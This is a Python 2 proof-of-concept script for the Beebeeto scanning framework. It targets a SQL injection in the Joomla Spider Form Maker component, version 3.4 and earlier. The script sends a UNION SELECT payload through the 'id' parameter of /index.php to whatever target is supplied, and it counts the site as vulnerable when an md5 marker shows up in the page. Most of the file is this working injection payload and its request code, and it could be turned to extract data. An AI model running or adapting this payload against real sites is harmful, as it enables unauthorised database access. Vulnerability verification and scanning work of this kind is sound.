#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0111',
            'name': 'Joomla Spider Form Maker <=3.4 SQL注入漏洞 POC',
            'author': 'H4rdy',
            'create_date': '2014-10-24',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Joomla Spider From Maker',
            'vul_version': ['<=3.4'],
            'type': 'SQL Injection',
            'tag': ['Joomla漏洞', 'SQL注入漏洞', '/index.php'],
            'desc': 'Joomla 3.4 /index.php 文件"id" 变量没有进行过滤.',
            'references': ['http://www.exploit-db.com/exploits/34637/',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        payload = ("/index.php?option=com_formmaker&view=formmaker&id=1%20UNION%20ALL%20SELECT%20NULL,"
                   "NULL,NULL,NULL,NULL,CONCAT(0x7165696a71,IFNULL(CAST(md5(3.1415)%20AS%20CHAR),0x20),"
                   "0x7175647871),NULL,NULL,NULL,NULL,NULL,NULL,NULL%23")
        verify_url = args['options']['target'] + payload
        req = urllib2.Request(verify_url)
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        content = urllib2.urlopen(req).read()
        if "63e1f04640e83605c1d177544a5a0488" in content:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())